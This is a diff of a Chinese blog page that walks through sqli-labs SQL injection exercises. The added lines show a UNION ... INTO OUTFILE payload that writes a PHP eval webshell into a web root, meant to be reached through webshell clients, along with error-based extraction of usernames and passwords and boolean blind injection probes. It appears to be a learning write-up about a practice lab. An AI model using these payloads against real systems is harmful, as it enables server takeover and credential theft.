@@ -195,7 +195,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.1k 字
+      2.6k 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      25
+      30
        分钟
     </span>
   
@@ -307,30 +307,40 @@
 <figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//查询security.users下第一行的username和<span class="hljs-keyword">password</span>并用“~”隔开<br></code></pre></div></td></tr></table></figure></li>
 </ul>
 <hr>
-<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>​        这里使mysql语句闭合的方式为<code>?id=1&#39;))...%23</code>比之前略微复杂,没有具体的语法报错内容，只能多次尝试。同样页面不在显示有用的内容，只能看出语句是否正确，同5~6情况相似，最多可用<code>order by</code>得到<code>union select</code> 的字段数。但这关双注入的方式失效了，根据提示采用上传文件的方式。</p>
-<p><strong>ps：途中我遇到了怎么也上传不了文件的情况， <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1671259">这里</a>解释了原因</strong></p>
+<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>​        这里使mysql语句闭合的方式为<code>?id=1&#39;))...%23</code>比之前略微复杂,而且还没有具体的语法报错内容，只能多次尝试（这也太不友好了…<a target="_blank" rel="noopener" href="https://blog.csdn.net/gou1791241251/article/details/111568910">点击查看这位老哥构造闭合语句的过程</a>）。同样页面不在显示有用的内容，只能看出语句是否正确，同5~6情况相似，最多可用<code>order by</code>得到<code>union select</code> 的字段数。但这关双注入的方式失效了，根据提示采用上传文件的方式。</p>
+<p><strong>ps：途中我遇到了怎么也上传不了文件的情况， <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1671259">这里</a>解释了原因，即需要先修改配置，赋予权限</strong>。可以看出这个漏洞的实现有较严格的条件限制。</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618162821.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">...union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> into outfile<span class="hljs-string">&quot;C://hello.txt&quot;</span><br><span class="hljs-regexp">//</span>注意路径用“<span class="hljs-regexp">//</span>”,该语句执行结果如下，新生成了一个写有内容的hello文件。（好厉害直接就在C盘里塞东西）<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210606235322.png" srcset="/img/loading.gif" lazyload></p>
-<p>将<code>hello.txt</code>改成一句话木马的php文件,再使用菜刀或蚁剑链接就可以了。</p>
+<p>将<code>hello.txt</code>改成一句话木马的php文件,因为这里的服务器是用PHP study搭建的，所以需要把该文件上传至<code>PHPTutorial\WWW</code>目录下（不同版本的phpstudy路径可能不同，而至于实际渗透环境中，这个目录就需要靠方法找了，这里暂时提供一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/YQavenger/article/details/108967912">别人的方法-来自csdn</a>），再使用菜刀或蚁剑链接就可以了。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">...?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;))union select &quot;hello world!&quot;,&#x27;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;,&quot;hacked!&quot; into outfile &quot;E:\\PHPTutorial\\WWW\\a.php&quot; %23</span><br><span class="hljs-string">//select 的值会写进文件中，若想写入字符串字符串需要用单引号或双引号闭合</span><br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618230901.png" srcset="/img/loading.gif" lazyload></p>
+<p><em>尝试链接时，最开始我用的菜刀，过了一天就报毒，然后被系统自己删了；然后换了蚁剑，结果连不上，之前连dvwa时也是链接不上，但我都能直接访问….用蚁剑就连起了几个在线靶场的环境。我认为应该就是蚁剑出了问题，可这俩玩意我都是从github上官方下的…这阵子比较忙以后再弄工具</em></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618231315.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618231725.png" srcset="/img/loading.gif" lazyload></p>
+<p>（正常的话应该会显示绿色的对话框提示链接成功的）</p>
+<p>因为是直接上传了木马，链接成功的话就能直接控制服务器了。sql注入这个文件上传的漏洞威胁显然是很大的，我感觉以后遇到的情况会很少。</p>
 <hr>
 <h3 id="8-10"><a href="#8-10" class="headerlink" title="8~10"></a>8~10</h3><p>这里开始接触盲注，（盲注：后台使用了一些方法屏蔽了把偶从信息，此时无法通过报错信息进行注入的判断）同时这也是最常见的sql注入。</p>
 <p>盲注又大概分为布尔型和时间型。</p>
 <p><strong>另外因为盲注会比较繁琐，所以有必要学会使用，编写脚本。</strong></p>
-<p>接下来我会从手注，使用sqlmap,自己编写的python脚本三种方式来完成。</p>
+<p>接下来我会从手注并配合python脚本的方式来完成。</p>
 <p>手注：</p>
 <p>​    同样可以先进行这两步：</p>
 <ul>
-<li><p>输入单双引号，观察报错信息，构造命令使语句闭合</p>
+<li><p>输入单双引号，观察显示信息，构造命令使语句闭合</p>
 </li>
 <li><p>使用 order by 语句判断字段数</p>
-<p>因为显示的信息没了，页面只有语句的对错提示，就只能靠猜的方式去完成注入。就像这样：</p>
+<p>因为显示的信息只有两种情况，语句正确时显示一句话”You are in…“,语句错误时没有显示。我们就只能利用这个信息，靠猜的方式去完成注入。这就是使用基于bool类型的注入。</p>
+<p>就像这样：</p>
 <figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl">输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database()) = 5 --+，显示异常</span><br><span class="hljs-string">输入1&#x27;</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>()) = <span class="hljs-number">6</span> --+，显示异常</span><br><span class="hljs-function">输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database()) = 7 --+，显示异常</span></span><br><span class="hljs-string"><span class="hljs-function">输入1&#x27;</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>()) = <span class="hljs-number">8</span> --+，显示正常</span><br><span class="hljs-function"><span class="hljs-comment">//说明数据库名长度为8个字符。</span></span><br></code></pre></div></td></tr></table></figure>
 
 <p>即像这种一步步爆破的方式。这还只是得到了一个模糊的信息，注入的工作还远远没完成。所以学会利用工具是很有必要的。</p>
-<figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span> #，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">97</span>（小写字母a的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">122</span> #，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值小于<span class="hljs-number">122</span>（小写字母z的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">109</span> #，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">109</span>（小写字母m的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">115</span> #，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不小于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span> #，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不大于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br><br><span class="hljs-comment">//substr(xxx,y,z)，指的是从xxx中第y个字符开始取出z个字符。</span><br><span class="hljs-comment">//所以数据库名的第一个字符的ascii值为115，即小写字母s。</span><br><span class="hljs-comment">//其它位依次操作，得到结果security</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">97</span>（小写字母a的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">122</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值小于<span class="hljs-number">122</span>（小写字母z的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">109</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">109</span>（小写字母m的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不小于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不大于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br><br><span class="hljs-comment">//substr(xxx,y,z)，指的是从xxx中第y个字符开始取出z个字符。</span><br><span class="hljs-comment">//所以数据库名的第一个字符的ascii值为115，即小写字母s。</span><br><span class="hljs-comment">//其它位依次操作，得到结果security</span><br></code></pre></div></td></tr></table></figure>
 
-<p>老实说到这里光靠手注我已经进行不下去了。我再找找资料看看，手注最科学的方法就这吗0.0…</p>
+<p>老实说到这里光靠手注我已经进行不下去了…上脚本。关于脚本的编写请见我这一篇文章</p>
 </li>
 </ul>
 <hr>
